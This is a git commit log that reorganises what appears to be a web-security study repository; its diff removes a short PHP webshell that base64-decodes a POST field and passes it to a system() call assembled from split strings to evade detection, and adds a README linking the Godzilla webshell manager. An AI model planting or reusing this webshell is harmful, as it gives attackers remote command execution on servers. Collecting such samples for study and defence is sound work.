a93e8ae13aa7768beebb46fe88fcbba907edadf9
233JG <ayusummer233@gmail.com>
2024-04-19 15:28:48 +0800

    🎨 目录结构调整

--- PHP/security/shell/shell_base64_presuffix/shell_alter.php
+++
@@ -1,6 +0,0 @@
-<? 
-$st = $_POST['test']; 
-$sa = str_replace('joker','',$st); 
-$sb = 'base64_'.'decode';
-$sc = 'sys'.'tem';
-$sc($sb($sa));
---
+++ security/Web/webshell/manager/godzilla/README.md
@@ -0,0 +1,4 @@
+# Godzilla
+
+[源仓库地址](https://github.com/BeichenDream/Godzilla)
+
